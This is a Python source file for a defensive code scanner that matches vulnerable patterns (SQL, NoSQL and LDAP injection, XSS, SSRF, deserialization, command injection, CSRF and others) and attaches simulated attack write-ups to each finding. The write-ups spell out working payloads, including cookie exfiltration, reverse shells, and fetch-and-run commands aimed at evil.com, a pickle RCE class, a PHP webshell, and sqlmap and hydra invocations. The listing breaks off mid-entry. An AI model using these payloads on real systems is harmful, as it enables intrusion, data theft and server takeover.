"""Attack simulator v2 — context-aware attack vector simulation."""

import json
import os
import re
import time
from dataclasses import dataclass, field
from typing import Optional

from .base import BaseScanner, Category, Finding, ScanResult, Severity


SKIP_DIRS = {
    "node_modules", ".git", "__pycache__", ".venv", "venv", "env",
    "dist", "build", ".next", "vendor", "site-packages", ".pytest_cache",
    "coverage", "__tests__", "test", "tests", "spec",
}

MAX_FILE_SIZE = 1_000_000


@dataclass
class AttackPattern:
    title: str
    severity: Severity
    category: Category
    pattern: str
    description: str
    recommendation: str
    cwe_id: str
    attack_simulation: str
    suppress: list[str] = field(default_factory=list)
    extensions: Optional[set[str]] = None
    context_lines: int = 5
    context_require: Optional[str] = None      # regex that must match in context
    context_exclude: Optional[str] = None      # regex that must NOT match in context


CODE_EXTS = {".py", ".js", ".ts", ".jsx", ".tsx", ".php", ".rb", ".java", ".go", ".cs", ".vue", ".svelte"}
WEB_EXTS  = {".js", ".ts", ".jsx", ".tsx", ".html", ".php", ".rb", ".java", ".vue", ".svelte", ".erb"}
TPL_EXTS  = {".html", ".htm", ".jinja2", ".j2", ".tpl", ".erb", ".ejs", ".hbs", ".pug"}


ATTACK_PATTERNS: list[AttackPattern] = [
    # ── SQL INJECTION ─────────────────────────────────────────────────────────
    AttackPattern(
        title="[ATTACK SIM] SQL Injection via ORM Raw Query",
        severity=Severity.CRITICAL,
        category=Category.INJECTION,
        pattern=r"\.raw\s*\(.*?(?:format\s*\(|%s|\+\s*(?:request|params|args|data|input|user)|f['\"].*?\{)",
        suppress=[r"#.*\.raw", r"\"\"\".*\.raw", r"\'\'\'.*\.raw"],
        description=(
            "SIMULATED ATTACK: ORM raw query built with string interpolation, "
            "making it vulnerable to SQL injection."
        ),
        recommendation=(
            "Use parameterized queries: Model.objects.raw('SELECT * FROM t WHERE id=%s', [user_id]). "
            "Never concatenate user input into raw SQL strings."
        ),
        cwe_id="CWE-89",
        attack_simulation=(
            "ATTACK VECTOR: POST /api/search\n"
            "PAYLOAD: {\"query\": \"' UNION SELECT username,password,email FROM users--\"}\n"
            "IMPACT: Full database extraction including credentials and PII.\n"
            "STEPS:\n"
            "  1. Attacker identifies input reflected in database query\n"
            "  2. Tests with single quote to trigger SQL syntax error\n"
            "  3. Enumerates tables via UNION-based injection\n"
            "  4. Dumps user credentials (admin hashes, emails)\n"
            "  5. Cracks hashes offline or uses credentials for account takeover\n"
            "TOOL: sqlmap -u 'http://target/api/search' --data='query=test' --dbs --batch"
        ),
    ),
    AttackPattern(
        title="[ATTACK SIM] SQL Injection via String Concatenation",
        severity=Severity.CRITICAL,
        category=Category.INJECTION,
        pattern=r"""(?:execute|cursor\.execute|query)\s*\(\s*['"][^'"]*['"]\s*\+""",
        suppress=[r"#\s*execute", r"\"\"\""],
        description="SIMULATED ATTACK: SQL query built by concatenating user-controlled strings.",
        recommendation=(
            "Replace concatenation with parameterized placeholders: "
            "cursor.execute('SELECT * FROM t WHERE id=%s', (user_id,))"
        ),
        cwe_id="CWE-89",
        attack_simulation=(
            "ATTACK VECTOR: Any HTTP parameter concatenated into SQL\n"
            "PAYLOAD: 1' OR '1'='1\n"
            "PAYLOAD (destructive): 1; DROP TABLE users;--\n"
            "IMPACT: Authentication bypass, data deletion, full DB dump.\n"
            "TOOL: sqlmap -u 'http://target/api?id=1' --level=5 --risk=3 --batch"
        ),
    ),
    AttackPattern(
        title="[ATTACK SIM] NoSQL Injection",
        severity=Severity.HIGH,
        category=Category.INJECTION,
        pattern=r"""(?:find|findOne|findById|aggregate|update|deleteOne)\s*\(\s*(?:req\.|request\.|params\.|query\.|body\.)""",
        suppress=[r"#\s*find"],
        context_exclude=r"sanitize|escape|validate",
        description=(
            "SIMULATED ATTACK: MongoDB/NoSQL query built directly from request parameters "
            "without sanitization — operator injection possible."
        ),
        recommendation=(
            "Sanitize user input with mongo-sanitize or express-mongo-sanitize. "
            "Validate that query fields match expected types (string, not object)."
        ),
        cwe_id="CWE-943",
        attack_simulation=(
            "ATTACK VECTOR: POST /api/login\n"
            "PAYLOAD: {\"username\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"}}\n"
            "IMPACT: Authentication bypass — returns first user record (admin).\n"
            "OPERATOR INJECTION: Replace string values with {$regex: '.*'} to match all records.\n"
            "TOOL: Use Burp Suite to intercept and modify JSON body with operator payloads."
        ),
    ),

    # ── XSS / INJECTION ───────────────────────────────────────────────────────
    AttackPattern(
        title="[ATTACK SIM] Reflected XSS via innerHTML",
        severity=Severity.HIGH,
        category=Category.XSS,
        extensions=WEB_EXTS,
        pattern=r"innerHTML\s*[+=]\s*.*?(?:location|search|hash|params|query|req\.|request\.|\.value|getParameter|URLSearchParams)",
        suppress=[r"//.*innerHTML", r"DOMPurify\.sanitize", r"sanitizeHtml"],
        description=(
            "SIMULATED ATTACK: URL parameter or user input rendered via innerHTML "
            "without sanitization, enabling reflected XSS."
        ),
        recommendation=(
            "Use textContent for plain text output. "
            "If HTML is required, sanitize with DOMPurify.sanitize(input) before assigning to innerHTML."
        ),
        cwe_id="CWE-79",
        attack_simulation=(
            "ATTACK VECTOR: Crafted URL sent to victim via email or chat\n"
            "PAYLOAD: ?q=<img src=x onerror=\"fetch('https://evil.com/?c='+document.cookie)\">\n"
            "IMPACT: Session cookie theft, account takeover, keylogging, defacement.\n"
            "STEPS:\n"
            "  1. Attacker discovers URL parameter reflected via innerHTML\n"
            "  2. Crafts URL with XSS payload and encodes it\n"
            "  3. Sends link to victim (phishing, social engineering)\n"
            "  4. Victim visits URL — payload executes in their browser session\n"
            "  5. Attacker's server receives victim session tokens\n"
            "  6. Attacker replays cookie to impersonate victim"
        ),
    ),
    AttackPattern(
        title="[ATTACK SIM] DOM-based XSS via document.write",
        severity=Severity.HIGH,
        category=Category.XSS,
        extensions=WEB_EXTS,
        pattern=r"document\.write\s*\(.*?(?:location|search|hash|params|\.value|unescape|decodeURI)",
        suppress=[r"//.*document\.write", r"DOMPurify"],
        description=(
            "SIMULATED ATTACK: document.write() called with URL-derived content "
            "creates a DOM-based XSS sink."
        ),
        recommendation=(
            "Avoid document.write() entirely. "
            "Use DOM manipulation methods (createElement, textContent) and sanitize any HTML content."
        ),
        cwe_id="CWE-79",
        attack_simulation=(
            "ATTACK VECTOR: URL fragment or query parameter\n"
            "PAYLOAD: #<script>new Image().src='https://evil.com/?c='+document.cookie</script>\n"
            "IMPACT: Cookie theft without server logs (DOM-based — no reflection needed).\n"
            "NOTE: DOM XSS is harder to detect as it never hits the server — bypasses WAFs."
        ),
    ),
    AttackPattern(
        title="[ATTACK SIM] Server-Side Template Injection (SSTI)",
        severity=Severity.CRITICAL,
        category=Category.INJECTION,
        pattern=r"render_template_string\s*\(.*?(?:request\.|req\.|params\.|args\.|form\.|data\.|input|user)",
        suppress=[r"#\s*render_template"],
        description=(
            "SIMULATED ATTACK: User-controlled input passed to Jinja2/Flask "
            "render_template_string() — leads to Remote Code Execution."
        ),
        recommendation=(
            "Never pass user input to render_template_string(). "
            "Use render_template() with static template files and pass data as context variables only."
        ),
        cwe_id="CWE-94",
        attack_simulation=(
            "ATTACK VECTOR: Any input field that renders template syntax\n"
            "PAYLOAD: {{7*7}} → if output is 49, SSTI is confirmed\n"
            "RCE PAYLOAD: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}\n"
            "IMPACT: Full Remote Code Execution — attacker controls the server.\n"
            "  Can read /etc/passwd, exfiltrate .env files, spawn reverse shells.\n"
            "TOOL: tplmap -u 'http://target/page?name=test' --os-shell"
        ),
    ),
    AttackPattern(
        title="[ATTACK SIM] LDAP Injection",
        severity=Severity.HIGH,
        category=Category.INJECTION,
        pattern=r"""ldap(?:\.search|_search|\.bind|_bind|\.modify)\s*\(.*?(?:request\.|req\.|params\.|f['"].*?\{|%s|\+\s*\w)""",
        suppress=[r"ldap\.escape", r"escape_filter_chars"],
        description=(
            "SIMULATED ATTACK: User input concatenated into LDAP query "
            "enables filter manipulation and authentication bypass."
        ),
        recommendation=(
            "Escape special characters using ldap3.utils.conv.escape_filter_chars(). "
            "Use a whitelist for allowed LDAP attributes."
        ),
        cwe_id="CWE-90",
        attack_simulation=(
            "ATTACK VECTOR: Login form with LDAP backend\n"
            "PAYLOAD username: *)(uid=*))(|(uid=*\n"
            "PAYLOAD password: anything\n"
            "IMPACT: Authentication bypass — attacker logs in as any user including admin.\n"
            "ADVANCED: )(|(password=*) to enumerate valid usernames."
        ),
    ),

    # ── PATH TRAVERSAL / LFI ──────────────────────────────────────────────────
    AttackPattern(
        title="[ATTACK SIM] Path Traversal / Local File Inclusion",
        severity=Severity.HIGH,
        category=Category.FILE_INCLUSION,
        pattern=r"(?:send_file|send_from_directory|open|readFile|createReadStream|fs\.read)\s*\(.*?(?:request\.|req\.|params\.|query\.|args\.|\.get\()",
        suppress=[r"os\.path\.join\(app\.", r"safe_join", r"realpath", r"#.*send_file"],
        description=(
            "SIMULATED ATTACK: User-controlled path used in file serving "
            "without directory restriction — allows reading arbitrary files."
        ),
        recommendation=(
            "Resolve and validate the path stays within the intended directory:\n"
            "  safe = os.path.realpath(os.path.join(base_dir, user_path))\n"
            "  if not safe.startswith(os.path.realpath(base_dir)): abort(403)"
        ),
        cwe_id="CWE-22",
        attack_simulation=(
            "ATTACK VECTOR: File download or view endpoint\n"
            "PAYLOADS:\n"
            "  GET /download?file=../../../etc/passwd\n"
            "  GET /download?file=..%2F..%2F..%2Fetc%2Fshadow  (URL-encoded)\n"
            "  GET /download?file=....//....//etc/passwd  (double-dot bypass)\n"
            "IMPACT: Read /etc/passwd, /etc/shadow, app source code, .env files.\n"
            "STEPS:\n"
            "  1. Identify file parameter in URL or body\n"
            "  2. Fuzz with ../ sequences and encoding variants\n"
            "  3. Read /etc/passwd to enumerate OS users\n"
            "  4. Read application config for DB credentials\n"
            "  5. Use credentials for privilege escalation"
        ),
    ),

    # ── SSRF ──────────────────────────────────────────────────────────────────
    AttackPattern(
        title="[ATTACK SIM] Server-Side Request Forgery (SSRF)",
        severity=Severity.HIGH,
        category=Category.INJECTION,
        pattern=r"""(?:requests\.get|requests\.post|urllib\.request|fetch|axios\.get|http\.get|wget)\s*\(.*?(?:request\.|req\.|params\.|query\.|args\.|body\.|\.get\()""",
        suppress=[r"#.*requests\.get", r"requests\.get\s*\(\s*['\"]https?://"],
        context_exclude=r"urlparse|is_safe|whitelist|allowlist|validate_url",
        description=(
            "SIMULATED ATTACK: Server makes HTTP request to a URL controlled by the attacker, "
            "allowing access to internal services and cloud metadata."
        ),
        recommendation=(
            "Validate the URL against a whitelist of allowed domains/IPs. "
            "Block requests to private IP ranges (10.x, 172.16-31.x, 192.168.x, 169.254.x). "
            "Use a dedicated library like ssrf-req-filter."
        ),
        cwe_id="CWE-918",
        attack_simulation=(
            "ATTACK VECTOR: Any parameter that triggers a server-side HTTP request\n"
            "PAYLOADS:\n"
            "  url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\n"
            "  url=http://169.254.169.254/latest/user-data  (AWS metadata)\n"
            "  url=http://metadata.google.internal/computeMetadata/v1/  (GCP)\n"
            "  url=http://localhost:6379/  (internal Redis)\n"
            "  url=http://10.0.0.1:5432/  (internal PostgreSQL)\n"
            "IMPACT: Cloud credential theft, access to internal services, RCE via Redis SSRF.\n"
            "TOOL: SSRFmap, Burp Collaborator for blind SSRF detection"
        ),
    ),

    # ── AUTHENTICATION BYPASS ─────────────────────────────────────────────────
    AttackPattern(
        title="[ATTACK SIM] Hardcoded Password Comparison",
        severity=Severity.CRITICAL,
        category=Category.BROKEN_AUTH,
        pattern=r"""if\s+.*?(?:password|passwd|pwd|secret)\s*==\s*['"][^'"]{3,}['"]""",
        suppress=[r"#.*password.*==", r"test.*password.*==", r"example"],
        description=(
            "SIMULATED ATTACK: Authentication uses hardcoded password comparison "
            "— any code reviewer or leaked source code owner can authenticate."
        ),
        recommendation=(
            "Hash passwords with bcrypt/argon2id before storage. "
            "Compare with bcrypt.checkpw(input_pass, stored_hash) — never compare plaintext."
        ),
        cwe_id="CWE-798",
        attack_simulation=(
            "ATTACK VECTOR: Source code review (GitHub leaks, decompilation)\n"
            "METHOD: Extract hardcoded credential from source, replay against login endpoint\n"
            "IMPACT: Complete authentication bypass for any account using the hardcoded value.\n"
            "NOTE: Even if hash is used, rainbow tables can crack common passwords in seconds.\n"
            "TOOL: hashcat -m 3200 hash.txt rockyou.txt  (bcrypt brute force)"
        ),
    ),
    AttackPattern(
        title="[ATTACK SIM] Brute Force on Authentication Endpoint",
        severity=Severity.MEDIUM,
        category=Category.BROKEN_AUTH,
        pattern=r"""(?:@app\.route|@router\.\w+|router\.\w+\(|app\.\w+\()\s*[^)]*(?:login|auth|signin|token|oauth)""",
        context_exclude=r"rate.?limit|throttle|limiter|slowapi|ratelimit|Throttle|RateLimit|lock.?out",
        description=(
            "SIMULATED ATTACK: Authentication/token endpoint without rate limiting "
            "detected — vulnerable to credential stuffing and brute force attacks."
        ),
        recommendation=(
            "Implement rate limiting: flask-limiter / express-rate-limit. "
            "Add account lockout after 5-10 failed attempts. "
            "Implement CAPTCHA for repeated failures. "
            "Monitor and alert on failed login bursts."
        ),
        cwe_id="CWE-307",
        attack_simulation=(
            "ATTACK VECTOR: POST /login or /api/token\n"
            "METHOD: Automated credential stuffing with breached password lists\n"
            "TOOL: hydra -L users.txt -P rockyou.txt http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'\n"
            "SCALE: Without rate limiting, 10,000+ attempts/minute from a single IP.\n"
            "IMPACT: Account takeover, admin access, data breach.\n"
            "DEFENSE TEST: Check if X-Forwarded-For bypass circumvents IP-based rate limiting."
        ),
    ),
    AttackPattern(
        title="[ATTACK SIM] JWT Algorithm Confusion Attack",
        severity=Severity.CRITICAL,
        category=Category.BROKEN_AUTH,
        pattern=r"""(?:jwt\.decode|verify|decode)\s*\(.*?algorithms?\s*=\s*\[['"](?:none|HS256)['"]\]""",
        suppress=[r"#.*jwt", r"algorithms=\[.{0,5}RS256"],
        description=(
            "SIMULATED ATTACK: JWT decoded with weak or 'none' algorithm — "
            "an attacker can forge tokens without knowing the secret key."
        ),
        recommendation=(
            "Always specify strong algorithms explicitly: algorithms=['RS256'] or ['HS256'].\n"
            "Never accept 'none' algorithm. "
            "Validate iss, aud, exp claims. "
            "Use python-jose or PyJWT ≥2.4.0."
        ),
        cwe_id="CWE-347",
        attack_simulation=(
            "ATTACK VECTOR: JWT token in Authorization header\n"
            "ALGORITHM CONFUSION: Change alg to 'none' → server accepts unsigned token\n"
            "STEPS:\n"
            "  1. Decode JWT: base64(header).base64(payload).\n"
            "  2. Modify header: {\"alg\": \"none\", \"typ\": \"JWT\"}\n"
            "  3. Change payload: {\"role\": \"admin\", \"user_id\": 1}\n"
            "  4. Send token with empty signature: header.payload.\n"
            "  5. Vulnerable server accepts token without verification\n"
            "TOOL: jwt_tool.py -t <token> -X a  (none algorithm attack)"
        ),
    ),
    AttackPattern(
        title="[ATTACK SIM] JWT Secret Brute Force",
        severity=Severity.HIGH,
        category=Category.BROKEN_AUTH,
        pattern=r"""(?:jwt\.encode|sign)\s*\(.*?(?:secret|key)\s*[=:]\s*['"][^'"]{1,20}['"]""",
        suppress=[r"os\.environ", r"os\.getenv", r"config\.", r"settings\."],
        description=(
            "SIMULATED ATTACK: JWT signed with a short or static secret key "
            "— attackable via offline brute force with jwt_tool or hashcat."
        ),
        recommendation=(
            "Use a cryptographically random secret of at least 256 bits (32+ characters). "
            "Store in environment variables, never hardcoded. "
            "Prefer RS256 (asymmetric) over HS256 for public-facing APIs."
        ),
        cwe_id="CWE-321",
        attack_simulation=(
            "ATTACK VECTOR: Intercepted JWT token\n"
            "METHOD: Offline brute force of HMAC signature with common secret wordlists\n"
            "TOOL: hashcat -a 0 -m 16500 token.jwt jwt-secrets.txt\n"
            "TOOL: jwt_tool.py -t <token> -C -d common-secrets.txt\n"
            "IMPACT: Forge arbitrary tokens (admin, any user ID) once secret is cracked."
        ),
    ),

    # ── IDOR / PRIVILEGE ESCALATION ───────────────────────────────────────────
    AttackPattern(
        title="[ATTACK SIM] Insecure Direct Object Reference (IDOR)",
        severity=Severity.HIGH,
        category=Category.BROKEN_ACCESS,
        pattern=r"""(?:request|req|params|query|body)\.\w*(?:id|user_id|account_id|profile_id|order_id|doc_id)\b""",
        context_exclude=r"authorize|permission|is_owner|current_user|request\.user|get_object_or_404|has_perm|can_access",
        description=(
            "SIMULATED ATTACK: User-supplied resource ID used without ownership verification "
            "— attacker can access or modify other users' resources."
        ),
        recommendation=(
            "Always filter resources by the authenticated user: "
            "  Order.objects.filter(id=order_id, user=request.user)\n"
            "Never rely on client-supplied IDs alone for access control. "
            "Use UUIDs instead of sequential integers to reduce guessability."
        ),
        cwe_id="CWE-639",
        attack_simulation=(
            "ATTACK VECTOR: API endpoints with user-controlled resource IDs\n"
            "PAYLOADS:\n"
            "  GET /api/orders/1337 → increments to access other orders\n"
            "  PUT /api/users/42/email (as user 41)\n"
            "  DELETE /api/documents/100 (another user's document)\n"
            "TOOL: Burp Suite Intruder — enumerate IDs 1-10000 and check 200 responses\n"
            "IMPACT: Mass data breach, account takeover, unauthorized deletion/modification."
        ),
    ),
    AttackPattern(
        title="[ATTACK SIM] Mass Assignment Vulnerability",
        severity=Severity.HIGH,
        category=Category.BROKEN_ACCESS,
        pattern=r"""(?:update|create|save|bulk_update)\s*\(.*?(?:request\.data|req\.body|request\.json|params\.permit\?\()""",
        context_exclude=r"only=|exclude=|fields=|permit\(",
        description=(
            "SIMULATED ATTACK: Model updated directly from request body without field allowlisting "
            "— attacker can set privileged fields like 'role', 'is_admin', 'balance'."
        ),
        recommendation=(
            "Explicitly allowlist updateable fields:\n"
            "  serializer = UserSerializer(data=request.data, fields=['name', 'email'])\n"
            "Never pass raw request.data to save(). "
            "Use strong-params in Rails, serializer field allowlists in DRF/FastAPI."
        ),
        cwe_id="CWE-915",
        attack_simulation=(
            "ATTACK VECTOR: User profile update or registration endpoint\n"
            "PAYLOAD: PUT /api/users/me\n"
            "  {\"name\": \"Alice\", \"email\": \"a@b.com\", \"is_admin\": true, \"role\": \"admin\"}\n"
            "IMPACT: Privilege escalation to admin, balance manipulation, role elevation.\n"
            "STEPS:\n"
            "  1. Intercept normal update request in Burp Suite\n"
            "  2. Add extra fields from the model (is_admin, role, balance)\n"
            "  3. If server returns 200 and updates the field, vulnerability confirmed\n"
            "  4. Attacker now has elevated privileges"
        ),
    ),

    # ── DESERIALIZATION ───────────────────────────────────────────────────────
    AttackPattern(
        title="[ATTACK SIM] Insecure Deserialization (pickle)",
        severity=Severity.CRITICAL,
        category=Category.INJECTION,
        pattern=r"""pickle\.loads?\s*\(.*?(?:request\.|req\.|params\.|body\.|data\.|input|read\(\))""",
        suppress=[r"#.*pickle"],
        description=(
            "SIMULATED ATTACK: Python pickle.loads() called on user-controlled data "
            "— pickle can execute arbitrary code during deserialization."
        ),
        recommendation=(
            "Never deserialize pickle from untrusted sources. "
            "Use JSON or MessagePack instead. "
            "If pickle is required, cryptographically sign data with HMAC before deserializing."
        ),
        cwe_id="CWE-502",
        attack_simulation=(
            "ATTACK VECTOR: Any endpoint that accepts serialized data (cookie, parameter, body)\n"
            "PAYLOAD (Python):\n"
            "  import pickle, os\n"
            "  class Exploit(object):\n"
            "    def __reduce__(self):\n"
            "      return (os.system, ('curl evil.com/shell.sh | bash',))\n"
            "  payload = base64.b64encode(pickle.dumps(Exploit()))\n"
            "IMPACT: Remote Code Execution — attacker gets shell on the server.\n"
            "TOOL: PEAS (Pickle Exploit Automation Script)"
        ),
    ),
    AttackPattern(
        title="[ATTACK SIM] Insecure Deserialization (Java / unserialize)",
        severity=Severity.CRITICAL,
        category=Category.INJECTION,
        extensions={".java", ".php"},
        pattern=r"""(?:ObjectInputStream|unserialize)\s*\(.*?(?:request\.|req\.|getInputStream|getParameter|POST|body)""",
        suppress=[r"//.*ObjectInputStream"],
        description=(
            "SIMULATED ATTACK: Java ObjectInputStream or PHP unserialize() on user-controlled input "
            "— classic RCE vector in many CVEs (Apache Commons, Log4Shell chain)."
        ),
        recommendation=(
            "Java: Use whitelisting deserialization filter (ObjectInputFilter, SerialKiller). "
            "PHP: Use JSON instead of unserialize(). "
            "Sign serialized data and validate the signature before deserializing."
        ),
        cwe_id="CWE-502",
        attack_simulation=(
            "ATTACK VECTOR: Serialized Java/PHP object in HTTP body or cookie\n"
            "JAVA PAYLOAD: Apache Commons gadget chain → arbitrary command execution\n"
            "PHP PAYLOAD: __wakeup() magic method exploited to traverse filesystem\n"
            "TOOL: ysoserial.jar (Java gadget chains), PHPGGC (PHP gadget chains)\n"
            "IMPACT: Remote Code Execution on the server."
        ),
    ),

    # ── XXE ───────────────────────────────────────────────────────────────────
    AttackPattern(
        title="[ATTACK SIM] XML External Entity Injection (XXE)",
        severity=Severity.HIGH,
        category=Category.INJECTION,
        pattern=r"""(?:etree\.parse|minidom\.parse|SAXParser|XMLParser|parseString|lxml\.etree)\s*\(""",
        suppress=[r"defusedxml", r"resolve_entities\s*=\s*False", r"#.*parse"],
        context_exclude=r"defusedxml|no_network|resolve_entities=False|XMLParser\(.*resolve_entities=False",
        description=(
            "SIMULATED ATTACK: XML parsed without disabling external entities "
            "— attacker can read local files or trigger SSRF via entity references."
        ),
        recommendation=(
            "Use defusedxml library: import defusedxml.ElementTree as ET\n"
            "Or disable entities: parser = etree.XMLParser(resolve_entities=False, no_network=True)"
        ),
        cwe_id="CWE-611",
        attack_simulation=(
            "ATTACK VECTOR: Any endpoint that accepts XML input\n"
            "PAYLOAD:\n"
            "  <?xml version='1.0'?>\n"
            "  <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>\n"
            "  <root>&xxe;</root>\n"
            "IMPACT: Read /etc/passwd, application source code, AWS metadata via SSRF.\n"
            "BLIND XXE: Use out-of-band channel (DNS/HTTP) for data exfiltration.\n"
            "TOOL: XXEinjector, Burp Suite Pro XXE scanner"
        ),
    ),

    # ── OPEN REDIRECT ─────────────────────────────────────────────────────────
    AttackPattern(
        title="[ATTACK SIM] Open Redirect",
        severity=Severity.MEDIUM,
        category=Category.BROKEN_ACCESS,
        pattern=r"""(?:redirect|location\.href|res\.redirect|window\.location)\s*[=(]\s*.*?(?:request\.|req\.|params\.|query\.|args\.|\.get\()""",
        context_exclude=r"is_safe_url|url_has_allowed_host|validate|whitelist|allowlist",
        suppress=[r"#.*redirect"],
        description=(
            "SIMULATED ATTACK: Redirect target taken from user input without validation "
            "— enables phishing and OAuth token theft via redirect_uri manipulation."
        ),
        recommendation=(
            "Validate redirect URLs against an allowlist of trusted domains. "
            "In Django: use url_has_allowed_host_and_scheme(). "
            "In Express: validate against a whitelist before redirecting."
        ),
        cwe_id="CWE-601",
        attack_simulation=(
            "ATTACK VECTOR: ?next= or ?redirect_to= parameter on login/callback pages\n"
            "PAYLOAD: /login?next=https://evil.com/phishing\n"
            "OAUTH CHAIN: /oauth/callback?redirect_uri=https://evil.com → steal auth code\n"
            "IMPACT: Phishing, OAuth authorization code theft, credential harvesting.\n"
            "STEPS:\n"
            "  1. Find login or redirect endpoint with URL parameter\n"
            "  2. Replace target with attacker-controlled domain\n"
            "  3. Send phishing link — victim is redirected to fake login page\n"
            "  4. Victim enters credentials — attacker captures them"
        ),
    ),

    # ── COMMAND INJECTION ─────────────────────────────────────────────────────
    AttackPattern(
        title="[ATTACK SIM] OS Command Injection",
        severity=Severity.CRITICAL,
        category=Category.INJECTION,
        pattern=r"""(?:os\.system|subprocess\.(?:call|run|Popen|check_output|getoutput))\s*\(.*?(?:request\.|req\.|params\.|query\.|args\.|f['"].*?\{|%s|\+\s*\w)""",
        suppress=[r"shell=False", r"#.*os\.system"],
        context_exclude=r"shell=False",
        description=(
            "SIMULATED ATTACK: User input incorporated into OS command string "
            "— enables arbitrary command execution on the server."
        ),
        recommendation=(
            "Use subprocess with shell=False and a list of arguments:\n"
            "  subprocess.run(['ls', '-la', user_path], shell=False, check=True)\n"
            "Never pass user input to shell=True commands. "
            "Validate and sanitize all inputs with a strict allowlist."
        ),
        cwe_id="CWE-78",
        attack_simulation=(
            "ATTACK VECTOR: Any parameter used in shell command construction\n"
            "PAYLOADS:\n"
            "  ; cat /etc/passwd\n"
            "  | curl evil.com/shell.sh | bash\n"
            "  && nc -e /bin/sh evil.com 4444\n"
            "  `id`\n"
            "  $(whoami)\n"
            "IMPACT: Full server compromise — RCE, data theft, lateral movement.\n"
            "TOOL: commix --url='http://target/ping?host=127.0.0.1' --batch"
        ),
    ),

    # ── ReDoS / DoS ───────────────────────────────────────────────────────────
    AttackPattern(
        title="[ATTACK SIM] Regular Expression DoS (ReDoS)",
        severity=Severity.MEDIUM,
        category=Category.INJECTION,
        pattern=r"""re\.(?:compile|match|search|findall|fullmatch)\s*\(.*?(?:\.\*.*\.\*|\(\?:.*\)\+|\(.+\)\{[0-9]+,\})""",
        suppress=[r"#.*re\."],
        description=(
            "SIMULATED ATTACK: Complex regex with catastrophic backtracking "
            "— malicious input causes exponential CPU consumption."
        ),
        recommendation=(
            "Simplify regex patterns. Use possessive quantifiers or atomic groups. "
            "Enforce timeouts on regex operations. "
            "Use the 're2' library (linear-time) for user-supplied patterns."
        ),
        cwe_id="CWE-1333",
        attack_simulation=(
            "ATTACK VECTOR: Input field validated by complex regex\n"
            "PAYLOAD: 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!'\n"
            "  (each extra character doubles CPU time — exponential growth)\n"
            "IMPACT: Single request can peg CPU at 100% for minutes, causing denial of service.\n"
            "DETECTION: Test regex against long repetitive strings at regex101.com with timeout."
        ),
    ),
    AttackPattern(
        title="[ATTACK SIM] Unrestricted File Upload",
        severity=Severity.HIGH,
        category=Category.SECURITY_MISCONFIG,
        pattern=r"""(?:request\.files|req\.file|formidable|busboy|multer|FileSystemStorage)\b""",
        context_exclude=r"max.?size|limit|maxFileSize|fileSizeLimit|content.?type|mimetype|allowed_extensions",
        description=(
            "SIMULATED ATTACK: File upload without type validation or size limits "
            "— enables webshell upload, disk exhaustion, and malware distribution."
        ),
        recommendation=(
            "Validate MIME type and extension against an allowlist. "
            "Set maximum file size. "
            "Store uploads outside the web root (or in object storage like S3). "
            "Rename uploaded files with random UUIDs. "
            "Scan uploads with an antivirus API (ClamAV, VirusTotal)."
        ),
        cwe_id="CWE-434",
        attack_simulation=(
            "ATTACK VECTOR: File upload endpoint\n"
            "WEBSHELL UPLOAD: Upload shell.php disguised as shell.jpg.php\n"
            "  <?php system($_GET['cmd']); ?>\n"
            "DoS UPLOAD: Send 10GB file to exhaust disk space\n"
            "MALWARE: Upload executable and link victims to download it\n"
            "IMPACT: Remote code execution (if server executes uploaded files), disk exhaustion.\n"
            "TOOL: weevely generate secret shell.php"
        ),
    ),

    # ── CSRF ──────────────────────────────────────────────────────────────────
    AttackPattern(
        title="[ATTACK SIM] Cross-Site Request Forgery (CSRF)",
        severity=Severity.HIGH,
        category=Category.BROKEN_AUTH,
        extensions=TPL_EXTS | {".py", ".js", ".ts", ".php", ".rb"},
        pattern=r"<form\b[^>]*method=['\"]?post['\"]?",
        context_exclude=r"csrf|_token|authenticity_token|xsrf|CSRFProtect|csurf|csrf_exempt",
        description=(
            "SIMULATED ATTACK: HTML POST form found without CSRF token protection "
            "— attacker can trigger state-changing actions on behalf of authenticated users."
        ),
        recommendation=(
            "Add CSRF protection:\n"
            "  Flask: from flask_wtf.csrf import CSRFProtect; CSRFProtect(app)\n"
            "  Django: ensure {% csrf_token %} in all forms and CsrfViewMiddleware is enabled\n"
            "  Express: use csurf middleware\n"
            "Use SameSite=Strict cookie attribute as defense-in-depth."
        ),
        cwe_id="CWE-352",
        attack_simulation=(
            "ATTACK VECTOR: Malicious page auto-submitting form to your application\n"
            "PAYLOAD:\n"
            "  <form action='https://target.com/transfer' method='POST' id='f'>\n"
            "    <input name='amount' value='5000'>\n"
            "    <input name='to' value='attacker_account'>\n"
            "  </form>\n"
            "  <script>document.getElementById('f').submit()</script>\n"
            "IMPACT: Unauthorized fund transfers, password changes, data deletion.\n"
            "NOTE: Victim only needs to visit attacker's page while logged in."
        ),
    ),

    # ── INFORMATION DISCLOSURE ────────────────────────────────────────────────
    AttackPattern(
        title="[ATTACK SIM] Stack Trace Information Disclosure",
        severity=Severity.MEDIUM,
        category=Category.LOGGING,
        pattern=r"""(?:traceback\.(?:print_exc|format_exc)|e\.printStackTrace)\s*\(""",
        context_require=r"(?:return|response|jsonify|render|send|Response)\s*\(",
        suppress=[r"#.*traceback", r"log\."],
        description=(
            "SIMULATED ATTACK: Exception stack trace included in HTTP response "
            "— reveals internal paths, library versions, and database schema details."
        ),
        recommendation=(
            "Log errors server-side: logger.exception('Error processing request')\n"
            "Return generic error to client: return jsonify({'error': 'Internal server error'}), 500\n"
            "Use a global error handler (Flask @app.errorhandler, Express error middleware)."
        ),
        cwe_id="CWE-209",
        attack_simulation=(
            "ATTACK VECTOR: Send malformed input to trigger unhandled exceptions\n"
            "EXAMPLES:\n"
            "  Send SQL-breaking characters in numeric fields\n"
            "  Send oversized payloads to overflow buffers\n"
            "  Send malformed JSON/XML to break parsers\n"
            "DISCLOSED INFO: File paths, Python version, library versions, DB table names.\n"
            "SECONDARY ATTACKS: Use disclosed library versions to find known CVEs."
        ),
    ),
    AttackPattern(
        title="[ATTACK SIM] Debug Mode Enabled in Production",
        severity=Severity.HIGH,
        category=Category.SECURITY_MISCONFIG,
        pattern=r"""(?:app\.run|DEBUG)\s*[=(].*(?:True|debug\s*=\s*True)""",
        context_exclude=r"if\s+(?:__name__|os\.getenv|config\[)",
        description=(
            "SIMULATED ATTACK: Flask/Django debug mode enabled — "
